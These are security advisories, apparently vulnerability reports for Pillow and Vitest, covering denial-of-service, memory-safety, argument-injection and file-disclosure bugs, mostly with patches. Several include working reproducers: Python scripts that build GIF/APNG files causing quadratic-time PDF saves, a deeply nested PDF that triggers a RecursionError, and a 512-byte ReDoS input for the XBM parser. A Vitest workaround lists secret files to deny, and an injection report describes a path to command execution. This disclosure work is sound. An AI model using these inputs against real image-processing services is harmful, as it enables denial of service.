### Summary
The MSP RLE decoder expands run-length data into an in-memory buffer with no cap tied to the declared image size. A small file that passes the pixel-count check can force hundreds of megabytes or more of allocation when the application loads pixels.

### Details
The MSP decoder writes each run into an unbounded `io.BytesIO` and can expand roughly 85x per run:

- `src/PIL/MspImagePlugin.py:144-146`

### Impact
Memory-exhaustion denial of service from a tiny crafted image in any application that loads pixels. The expansion is decoupled from the declared pixel count, so `MAX_IMAGE_PIXELS` does not bound it.

``` ============================================================================ Quadratic-time DoS in PDF save_all (PdfParser.next_object_id) Location: src/PIL/PdfParser.py:629 in next_object_id() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow's PDF writer takes time proportional to the square of the number of frames when it saves a multi-frame image as a multi-page PDF. Anyone who can get an application to convert their uploaded image this way can tie up a worker at full CPU for minutes with a small file. A 240 KB animated image takes about 70 seconds, a 720 KB one an estimated 10 minutes, and a 125-byte animated PNG that merely *declares* a large frame count triggers the same slowdown with no upper bound short of 2³¹ frames. Memory stays under 100 MB and the decompression-bomb limit never applies. The cause is `PdfParser.next_object_id()` in `src/PIL/PdfParser.py`, which finds the next free id by computing `max(self.xref_table.keys())`. `XrefTable.keys()` rebuilds three sets over every id reserved so far on each call. `PdfImagePlugin._save()` calls it three times (four for palette images with transparency) per frame, for `n_frames` frames, before any page is written. That makes the id-reservation loop alone O(N²). Because `n_frames` is taken from the file before any frame is seeked, APNG's `acTL` count drives the loop even when the frames don't exist. In that case the save raises `OSError` only after the full delay. The precondition is that the application calls `im.save(..., "PDF", save_all=True)` on the attacker's file; `Image.open()` and `load()` alone do not reach this code. The attached reproducer shows 4× the frames costing about 11× the CPU for a valid GIF and about 16× for a fixed 125-byte APNG. The behaviour was introduced in `6207b44ab1ff` (2018-01-18) and first shipped in Pillow 5.1.0. A small patch that tracks the highest id in `XrefTable` makes the save linear. ## Details Saving a multi-frame image as a multi-page PDF (`im.save(fp, "PDF", save_all=True)`) costs CPU time proportional to the square of the frame count, independent of pixel content, because every object id the PDF writer reserves is found by rebuilding and scanning the set of all ids reserved so far. A 1×1-pixel animated GIF made of N identical 15-byte frames (built by the reproducer) gives, on a 2-CPU container with the stock build at this commit (absolute timings vary by machine; the growth rate does not): | frames | GIF size | `im.save(BytesIO(), "PDF", save_all=True)` | peak RSS | |---|---|---|---| | 2 000 | 30 KB | 1.1 s | | | 8 000 | 120 KB | 14.7 s | | | 16 000 | 240 KB | 70 s | 60 MB | | 32 000 | 480 KB | 262 s | 95 MB | | 48 000 | 720 KB | still running at 120 s (extrapolated ≈ 10 min) | | Each doubling of the input roughly quadruples the time. `cProfile` of the 8 000-frame save attributes 13.5 s of 17.6 s to 24 003 calls of `PdfParser.next_object_id` (8.9 s inside `XrefTable.keys`, 3.9 s inside `max`); encoding and writing the 8 000 pages is the remaining ~4 s and scales linearly. The per-page id reservation loop runs before any page is written: ```python # src/PIL/PdfImagePlugin.py:247-259 (_save) for im in ims: im_number_of_pages = 1 if save_all: im_number_of_pages = getattr(im, "n_frames", 1) … for i in range(im_number_of_pages): image_refs.append(existing_pdf.next_object_id(0)) if im.mode == "P" and "transparency" in im.info: image_refs.append(existing_pdf.next_object_id(0)) page_refs.append(existing_pdf.next_object_id(0)) contents_refs.append(existing_pdf.next_object_id(0)) ``` `n_frames` comes straight from the file (for GIF it is the number of image blocks; the GIF plugin counts them by walking block headers, which is cheap). The frames do not even have to exist: the loop runs on `n_frames` before any frame is seeked, and for APNG `n_frames` is the `num_frames` value declared in the `acTL` chunk, rejected only if it is 0 or above `0x80000000` (`src/PIL/PngImagePlugin.py:716-720`). A 125-byte APNG declaring 8 000 frames therefore costs the same ~10–13 s as the 120 KB GIF, and more without bound as the declared count grows. Each of the 3 (or 4, for `P` images with transparency) calls per frame lands here: ```python # src/PIL/PdfParser.py:626-634 def next_object_id(self, offset: int | None = None) -> IndirectReference: try: # TODO: support reuse of deleted objects reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) except ValueError: reference = IndirectReference(1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference # src/PIL/PdfParser.py:175-178 (XrefTable) def keys(self) -> set[int]: return ( set(self.existing_entries.keys()) - set(self.deleted_entries.keys()) ) | set(self.new_entries.keys()) ``` `_save` passes `offset=0`, so every reserved id is inserted into `xref_table.new_entries`. The k-th call therefore materialises three sets covering all k−1 previous ids, computes a difference and a union, and then `max()` scans the result — O(k) work to produce the integer k. Summed over 3N calls this is O(N²): for 48 000 frames, 144 002 calls over sets growing to 144 002 elements, on the order of 10¹⁰ set-element operations, all spent before `_write_image` is reached for the first frame. Nothing on this path consults `MAX_IMAGE_PIXELS` (the frames are 1×1) and nothing raises; for the GIF the save eventually completes and produces a valid PDF, and for the declared-only APNG it raises `OSError` only once the id loop has finished and the first missing frame is seeked. This reservation scheme was introduced in `6207b44ab1ff` ("issue #2959: support appending to existing PDFs", 2018-01-18) and first shipped in Pillow 5.1.0; before it, the writer numbered objects arithmetically. For contrast, `write_obj(ref, …)` with an already-reserved `ref` (`src/PIL/PdfParser.py:548-555`) only does a dict store, which is why the page-writing phase that follows is linear; the super-linear cost is entirely in how the next free id is computed. ## Impact The precondition is that the application saves the attacker's image as PDF with `save_all=True`; `Image.open()` and `load()` alone do not reach this code. An application that converts uploaded images to PDF this way — the documented way to get one page per frame from animated GIF/APNG/WebP or multi-page TIFF input — can have a worker held at 100 % CPU for about 10 minutes by a 720 KB GIF, about 4½ minutes by a 480 KB one, with the cost continuing to grow quadratically with upload size. With APNG the file size does not matter at all: a 125-byte file declaring N frames in `acTL` drives the same quadratic loop, up to the 2³¹ cap. The attacker controls only the file bytes; no unusual dimensions, modes or options are needed, memory use stays under 100 MB so memory limits do not intervene, and the decompression-bomb guard is not applicable. The consequence is denial of service of the process performing the conversion. Single-image PDF saves, and `save_all` saves of images with tens or hundreds of frames, are unaffected in practice. This is the same family as earlier accidentally-quadratic parsing issues fixed in Pillow (e.g. CVE-2021-28677, EPS `readline`), but on the PDF *writer* side, reached only through a save rather than on open, and driven by frame count rather than by line structure. ## Reproducing `repro` is a single Python script. Run it with the Python that has Pillow installed (`./repro`). It uses under 100 MB of RAM and writes no files. **Input.** Two kinds of file are built in memory, each with 2 000 and 8 000 frames: - `gif(n)`: a valid animated GIF — a `GIF89a` header with a 1×1 logical screen and a 2-colour global palette, then `n` copies of one 15-byte frame (a 1×1 image descriptor plus the LZW data for one pixel), then the trailer (30 and 120 KB). The only unusual thing about it is how many frames it has. - `apng(n)`: a 125-byte APNG — a 1×1 greyscale `IHDR`, an `acTL` chunk declaring `n` frames, one `fcTL`, one `IDAT` and `IEND`. Only the first frame exists; the other `n − 1` are merely declared. **Action.** Each file goes through what an upload-to-PDF converter would do: `Image.open(BytesIO(data))`, then `im.save(BytesIO(), "PDF", save_all=True)`, timed with `time.process_time()`. For the APNG the save raises `OSError` once the writer tries to seek to the second frame; that happens after the id-reservation loop has run for all `n` declared frames, so the exception is caught and the CPU time up to it is recorded. **Expected output** (stock build at this commit): ``` GIF frames= 2000 file= 30020 B save CPU= 1.03s result=ok GIF frames= 8000 file=120020 B save CPU= 11.68s result=ok GIF: 4x frames -> 11.3x CPU (linear ~4x, quadratic ~16x) APNG frames= 2000 file= 125 B save CPU= 0.65s result=OSError(Truncated File Read) APNG frames= 8000 file= 125 B save CPU= 10.48s result=OSError(Truncated File Read) APNG: 4x frames -> 16.1x CPU (linear ~4x, quadratic ~16x) BUG ``` A linear save would take about 4× as long for 4× the frames; here the GIF save grows ~11× and the APNG save ~16×, the latter with the file size fixed at 125 bytes. The script prints `BUG` when the save CPU for either format grows at least 8× for 4× the frames (twice the linear expectation), otherwise `OK`. Extending the same curve gives the figures in the table above: about 70 s at 16 000 frames (240 KB GIF), and about 10 minutes for a 720 KB file. With the attached patch applied, the GIF save takes 0.32 s / 1.20 s (3.7×) and the APNG save 0.01 s / 0.03 s, and the script prints `OK`. ## Suggested fix Make `next_object_id()` O(1) by tracking the highest object id ever stored in `XrefTable` instead of rebuilding the key set on every call. The attached patch does this in `src/PIL/PdfParser.py`: ```diff a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ class XrefTable: self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ class PdfParser: def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` `existing_entries` is only ever populated through `__setitem__` (from `read_xref_table` / `read_prev_trailer`), so the counter also covers ids read from an existing file in `append=True` mode. The one behavioural difference: when the highest-numbered existing object has just been deleted (`del_root()` / `rewrite_pages()` in append mode), the current code hands that id out again with generation 0, whereas the patch moves on to the next unused id — the more conservative choice for an xref table, and the one the existing `TODO: support reuse of deleted objects` comment points at. With the patch applied and Pillow rebuilt, the 16 000-frame save drops from ~70 s to ~2.5 s, fresh PDF output is unchanged, `Tests/test_file_pdf.py` and `Tests/test_pdfparser.py` pass, and the reproducer prints `OK`. An alternative limited to the writer would be to reserve the `3 × number_of_pages` ids in `PdfImagePlugin._save()` arithmetically from a single `next_object_id()` call, but fixing the allocator also covers `write_obj(None, …)` callers. The patch does not address a separate, linear issue: `PdfImagePlugin._save()` still trusts `n_frames` before any frame is decoded, so a tiny file whose format reports a declared-only frame count (APNG `acTL` up to 2³¹) still makes it loop `3 × n_frames` times before the first failing seek. Reserving ids per successfully seeked frame, or validating `n_frames` in such plugins, would close that. ## The patch Track the highest object ID in XrefTable so PdfParser.next_object_id() is O(1) instead of rebuilding and scanning the key set Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..82ebfb867 100644 a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -133,12 +133,15 @@ class XrefTable: ) # object ID => (offset, generation) self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ -624,11 +627,8 @@ class PdfParser: self.orig_pages = self.pages[:] def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` ## The reproducer
Reproducer — repro, 1,791 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # PDF save_all is O(frames^2): PdfParser.next_object_id() does max(XrefTable.keys()), # and keys() rebuilds sets of every id reserved so far, 3 calls per frame. # (a) valid 1x1 animated GIF, 15 bytes/frame; (b) 125-byte APNG whose acTL merely # *declares* N frames - ids are reserved for all N before the first seek fails. import io, struct, time, zlib from PIL import Image def gif(n): return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff" + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00" * n + b"\x3b") def apng(n): def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d)) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)) + chunk(b"acTL", struct.pack(">II", n, 0)) + chunk(b"fcTL", struct.pack(">IIIIIHHBB", 0, 1, 1, 0, 0, 1, 1, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00\x00")) + chunk(b"IEND", b"")) def save_pdf(data): im = Image.open(io.BytesIO(data)) t = time.process_time() try: im.save(io.BytesIO(), "PDF", save_all=True) res = "ok" except OSError as e: # APNG: frames don't exist, fails *after* the id loop res = f"OSError({e})" return time.process_time() - t, res bug = False for name, make in (("GIF", gif), ("APNG", apng)): t = {} for n in (2000, 8000): data = make(n) t[n], res = save_pdf(data) print(f"{name:4} frames={n:5} file={len(data):6} B save CPU={t[n]:6.2f}s result={res}") growth = t[8000] / t[2000] print(f"{name}: 4x frames -> {growth:.1f}x CPU (linear ~4x, quadratic ~16x)") if growth >= 8: bug = True print("BUG" if bug else "OK") ```

### Summary
`PdfParser`'s `get_value()` can recurse without any limit and crash with an uncaught `RecursionError`. It is reachable through `Image.save(im, fp=<pdf>, format="PDF", append=True)` when the existing PDF file is attacker-controlled. This is the same class of bug as https://github.com/advisories/GHSA-r73j-pqj5-w3x7 (the /Prev trailer chain loop, fixed earlier this year), in the same file, but in two different functions that fix did not touch.

### Details
**`get_value()` in `src/PIL/PdfParser.py`**

This is a classmethod that takes `max_nesting: int = -1` and has a guard:

```python
if max_nesting == 0:
    return None, None
```

Every recursive call (nested arrays, dictionaries, indirect object definitions) passes `max_nesting=max_nesting - 1`. Since the default and every call site start at -1, this only ever counts down further negative: -1, -2, -3, and so on. It never equals exactly 0, so the guard never runs. A PDF object with a value nested a few thousand levels deep is enough to hit Python's recursion limit. It does not even need a valid `/Pages` tree, since `read_pdf_info()` parses the `/Root` object's own dictionary first, before checking anything else.

This advisory reports a single vulnerability: an ineffective recursion-depth guard in `PdfParser.get_value()` (the sentinel  `-1`  default never reaches the `== 0` check). The mention of GHSA-r73j-pqj5-w3x7 is comparative context for an already-fixed, already-CVE'd bug in a different function — it is not a second vulnerability being reported. The three trigger paths (nested arrays/dicts/indirect objects) are not independently fixable; they share one root cause and one fix location in  get_value() .

### Steps to reproduce
Both PDFs below are plain text, built directly in Python, no PDF library needed.

```python
from PIL.PdfParser import PdfParser

def build_pdf(root):
    out = bytearray(b"%PDF-1.4\n")
    offset = len(out)
    out += f"1 0 obj\n".encode()
    out += root
    out += b"\nendobj\n"
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    xref_offset = len(out)
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    out += b"trailer\n"
    out += f"<< /Size 2 /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"
    return bytes(out)

bomb = b"[" * 3000 + b"]" * 3000
root = b"<< /Type /Catalog /Pages 2 0 R /Bomb " + bomb + b" >>"
with open("nesting_bomb.pdf", "wb") as f:
    f.write(build_pdf(root))

PdfParser("nesting_bomb.pdf")     # raises RecursionError
```

Expected: a clean `PdfFormatError`.

Actual: raises a raw `RecursionError: maximum recursion depth exceeded`.

### Impact
- Availability: an attacker who controls the content of a PDF file that an application later appends an image page to (`Image.save(..., format="PDF", append=True)`) can crash that request with a RecursionError, using a file of a few hundred bytes.
- Confidentiality: none.
- Integrity: none.
- Pillow cannot open PDFs for reading through `Image.open()`. `PdfParser` is only reached through the append-mode save path, so the app has to be doing that specific thing (for example, stamping or watermarking an existing PDF) for this to matter.

``` ============================================================================ ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes Location: src/PIL/XbmImagePlugin.py:58 in XbmImageFile._open() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 512-byte file makes Pillow's `Image.open()` spend about six minutes of processor time on one core before it gives up with `UnidentifiedImageError`. Anyone who can hand bytes to an application that opens images with Pillow's default settings can trigger this, for example through an upload form, a thumbnailer, or a service that checks whether a blob is an image. A few such files sent at once can tie up a typical pool of worker processes. The cause is the `xbm_head` regular expression in `src/PIL/XbmImagePlugin.py:32-40`, which `XbmImageFile._open()` (line 58) runs over the first 512 bytes of any stream whose prefix starts with `#define`. Several adjacent parts of the pattern can match the same characters. `[ \t]+` overlaps with `.*` in the width and height lines and with `[^_]*` in the optional hotspot lines, and `[\r\n]+` closing the hotspot group overlaps with the following `[\000-\377]*`. The header sets a run of k spaces after each `#define` and a run of k line terminators after `_y_hot`, then omits the `[]` after `_bits`. That forces Python's backtracking matcher to try every way of splitting those runs and rescan the remaining bytes each time. The cost grows roughly as k to the fifth power: k = 60 measured 375 s, while a well-formed XBM of the same size opens in about 40 ms. Because this happens before any format is identified, none of Pillow's size, pixel-count or decompression-bomb limits apply, and upload size limits do not help because the file is tiny. `ImageFile.Parser.feed()` repeats the cost on every chunk until the stream is identified. The only existing mitigation is passing a `formats=` allowlist that excludes `"XBM"`. The attached reproducer opens the same header with and without the trailing `[]`. The valid version opens as XBM in 52 ms. The broken version takes 0.1 s, 0.75 s, 3.0 s and 8.6 s at k = 10, 15, 20 and 25, and the slow k = 60 case is not run. This is the same class of bug as CVE-2021-25292 in `PdfParser`, but in a different plugin and reachable from plain `Image.open()`. ## Details `XbmImageFile._open()` identifies an XBM file by running the module-level regex `xbm_head` over the first 512 bytes of the stream. The pattern has several adjacent quantifier pairs that can consume the same characters, followed by a `[\000-\377]*_bits\[]` tail that rescans the rest of the buffer for every way of splitting them. A 512-byte input built to exercise all of them and then fail the final literal keeps `Image.open()` in `xbm_head.match()` for minutes before it raises `UnidentifiedImageError`. This 512-byte input (k = 60) takes 375 s of CPU in `Image.open(io.BytesIO(data))` with default settings, measured on the stock build at this commit: ```python k = 60 data = b"#define" + b" "*k + b"_width 1\r" data += b"#define" + b" "*k + b"_height 1\r" data += b"#define" + b" "*k + b"_x_hot 1\r" data += b"#define" + b" "*k + b"_y_hot 1" + b"\r"*k data += b"_bits" # no "[]": the final literal never matches data += b"A" * (512 - len(data)) # pad to the 512 bytes _open() reads ``` Calling `XbmImagePlugin.xbm_head.match(data)` directly gives the same picture: k = 10 → 0.11 s, k = 15 → 0.76 s, k = 20 → 3.0 s, k = 25 → 8.5 s, k = 30 → 19.9 s (roughly ×27 per doubling of k, i.e. about k^4.7). A well-formed 512-byte XBM matches in 10 µs and opens and loads through `Image.open()` in ~40 ms including plugin import; the same k = 60 header with `_bits[]` present matches in 5 µs. ### Summary
`Image.merge()` checks the mode of every input band except band 0. If band 0 is a single-band `I` or `F` image, the native merge routine reads a pixel pointer that is NULL for those modes and the process crashes. The IPTC plugin reaches this from a plain `Image.open()` followed by a load, and IPTC has no magic-byte prefilter, so a crafted file with no recognizable header can drive it.

### Details
The validation loop skips band 0:

- `src/PIL/Image.py:3795` iterates `for band in bands[1:]` and checks mode and size only for those.

For an `I` or `F` image the 8-bit plane `image8` is NULL (only `image32` is set). `ImagingMerge` dereferences `bands[0]->image8[y]` for the multi-band output modes:

- `src/libImaging/Bands.c:302`, `:311`, `:321`

The IPTC loader builds the band list from an attacker-typed sub-image and passes it to merge with the sub-image at index 0:

- `src/PIL/IptcImagePlugin.py:156-160`
- `src/PIL/IptcImagePlugin.py:169` registers the opener with no accept function.

### Summary
When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.

### Details
`glyph` is declared without a NULL initializer:

- `src/_imagingft.c:848`

The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:

- `src/_imagingft.c:1010-1013`

In the render loop the glyph is freed at the end of each iteration and not set back to NULL:

- `src/_imagingft.c:1242`

The cleanup frees it whenever a stroker exists:

- `src/_imagingft.c:1253-1256`

`ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.

### Summary

On `main`, even with the guard in #9725, it's possible to have these decoders read 1 to 3 bytes past the end of the passed buffer with a suitable width/height.

### Details

`ImagingRawDecode` and the `P;2L` / `P;4L` unpackers disagree about how many bytes a line of data occupies.

The raw decoder derives the line size from the bits per pixel

```c
state->bytes = (state->xsize * state->bits + 7) / 8;
```

and uses it both for the bounds check and to advance to the next line. For `P;2L` and `P;4L`, `bits` is 2 and 4 respectively.

But these two rawmodes are not packed pixels but 2 or 4 *bit planes*, each padded to a whole number of bytes. `unpackP2L` computes `s = (pixels + 7) / 8` and reads plane *k* at offset `k * s`, and `unpackP4L` does the same across four planes. Their real footprint is therefore `planes * ((xsize + 7) / 8)`.

For some widths, padding each plane separately makes this footprint larger than `state->bytes`. For example, at width 1, the decoder accounts for one byte, while the unpackers read two or four bytes. The decoder accepts data that is too short for the last line and on the other hand advances to subsequent lines by less than a line, so every line after the first is also read from the wrong offset.

#9725's check is misshapen for this:

* It can reject data of the right length: 8x1 `P;2L` image is 2 bytes but is not accepted.
* It still accepts buffers shorter than the unpackers require for a given image shape.
* It measures the length with `len(data)`, which is an element count rather than a byte count; e.g. `memoryview(array("I", [0,0,0,0,0]))` (20 bytes) is rejected while `mv.tobytes()` is accepted.

### Summary
`PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

#### Type
CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)

#### Vulnerable Codes

```python
infile_temp = None
if hasattr(fp, "name") and os.path.exists(fp.name):
    infile = fp.name                      # user-controlled path used as-is, without validation
else:
    in_fd, infile_temp = tempfile.mkstemp()
    os.close(in_fd)
    infile = infile_temp
    # ... (copy fp into a temporary file)

# Build Ghostscript command
command = [
    gs_binary,
    "-q",
    f"-g{width:d}x{height:d}",
    f"-r{res_x:f}x{res_y:f}",
    "-dBATCH",
    "-dNOPAUSE",
    "-dSAFER",                            # default sandbox — does NOT stop this injection
    f"-sDEVICE={device}",
    f"-sOutputFile={outfile}",
    "-c",
    f"{-bbox[0]} {-bbox[1]} translate",
    "-f",
    infile,                               # injected here: inserted into argv with no check for
                                          # option prefixes (-, --) or Ghostscript's @-file token
                                          # => argument injection (CWE-88)
    "-c",
    "showpage",
]
# ...
subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript
```

#### Root cause. 

When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f <infile> position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.

#### Affected
- Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).
- Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `"-f", infile`.

#### Suggested fix
Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):
```python
    if hasattr(fp, "name") and os.path.exists(fp.name):
        infile = os.path.abspath(fp.name)   # was: infile = fp.name
```
`os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.

### Impact
**Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.

**Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@<path>` causes Ghostscript to read additional command-line arguments from `<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).

Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)

### Why this is a Pillow bug (not the documented "block untrusted EPS" risk)
This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.
Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.

### Summary

In Vitest 5, Vite's `server.fs.deny` is not applied as intended on Vitest's dev servers. Depending on the server, files that Vite refuses to serve by default (such as `.env`, private keys and certificates, `.npmrc`, and `.git`) or Vitest's own API token file (`.vitest-secret-token`) can be read over plain HTTP by a client that can reach the server. In Browser Mode with `test.projects`, a malicious website can also read `.env` values through the developer's browser.

This only applies when Vitest runs an HTTP server, which happens with the UI (`--ui`), Browser Mode, or `api` enabled. Plain `vitest` and `vitest run` don't listen on any port and are not affected. The fix ships in `vitest`, and `@vitest/ui` and `@vitest/browser` are listed because they are what enables the affected setups. Both pin `vitest` to the same version as a peer dependency, so upgrading either one also requires the patched `vitest`. Users who enable `api` without `@vitest/ui` or `@vitest/browser` are also affected and should upgrade `vitest`.

### Details

Vitest 5 adds its API token file to `server.fs.deny`, but neither server ended up with the intended list. That's because of two Vite behaviors. Vite applies its default deny list only when `server.fs.deny` is unset, and it compiles the list into a matcher during config resolution, so later changes to the array have no effect.

| setup                              | listening server                | Vite's default deny list | `.vitest-secret-token`              |
| ---------------------------------- | ------------------------------- | ------------------------ | ----------------------------------- |
| plain `vitest` / `vitest run`      | none                            | not reachable            | not reachable                       |
| `--ui` or `api`                    | root                            | denied                   | **served** (fallback location only) |
| Browser Mode, single project       | root (also the browser server)  | denied                   | **served** (fallback location only) |
| Browser Mode with `test.projects`  | each browser project's server   | **served**               | denied                              |

- **Project servers** set `deny: ['.vitest-secret-token']` from a `config()` hook, which replaces Vite's defaults. A project server listens on a port in Browser Mode with `test.projects`, so in that setup a request like `GET /.env?raw` returns the file. A plain `GET /.env` is also served as `text/javascript`, so a malicious page can include it with `<script src="http://localhost:<port>/.env">`. A classic script include needs no CORS, and each dotenv line whose value is valid JavaScript (a quoted string, number, or boolean) runs as a global assignment the page can read. A syntax error anywhere in the file, such as a `#` comment, keeps the whole script from running. The same missing defaults also loosen Browser Mode's file-access checks for `server.readFile`/`writeFile`/`removeFile`, screenshots, and traces.
- **The root server** adds the token entry after Vite has compiled the matcher, so the entry is never applied. The token file normally lives in the per-user data directory, which is outside `server.fs.allow`. When that directory can't be written, for example in a container whose user has no writable `HOME`, Vitest falls back to `<workspaceRoot>/node_modules/.vitest/.vitest-secret-token`, which the root server then serves. The token authenticates the UI, `/__vitest_attachment__`, and the API WebSocket, whose RPC can write and rerun test files when `api.allowWrite`/`api.allowExec` are enabled.

### Impact

Information disclosure from the Vitest dev server, and with the token, privileged API access.

- **From a malicious website**, in Browser Mode with `test.projects`: while the browser server runs, any page the developer visits can read `.env` values that are valid JavaScript, through a classic `<script>` include. This works when the file consists of `KEY="value"` lines. An unquoted value causes a runtime error that stops the script at that line, so only the lines before it leak. A syntax error anywhere in the file, such as a `#` comment line or an `export` prefix, prevents the script from running at all. Recent Chrome versions may ask for Local Network Access permission first. `fetch` and XHR reads from other websites are still blocked by Vite's default CORS policy, and Vite's `Host` check blocks DNS rebinding. That CORS policy does allow localhost origins, so a page served from another local dev server could read full files. The token file can't be read through a classic `<script>`, because a bare token isn't valid JavaScript.
- **With local access or developer-set network exposure** (such as `api.host` or `browser.api.host`, port forwarding, or a published container port): full file contents are readable over plain HTTP, including the token file when it's in the fallback location.

Only the machine running Vitest is exposed, while it runs one of the setups above. Applications built or deployed from the project aren't affected.

The fix is in `vitest` `<PATCHED>`. Vitest 4 and earlier are unaffected. They don't persist an API token, and they don't override `server.fs.deny`.

### Workaround

Set `server.fs.deny` explicitly in the root Vitest config, including Vite's default list for your Vite version and the token file. For Vite 8.3:

```ts
export default defineConfig({
  server: {
    fs: {
      deny: [
        '.env',
        '.env.*',
        '*.{crt,pem,key,p12,pfx,cer,der}',
        '.npmrc',
        '.yarnrc.yml',
        '**/.git/**',
        '.vitest-secret-token',
      ],
    },
  },
})
```

### Summary

`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.

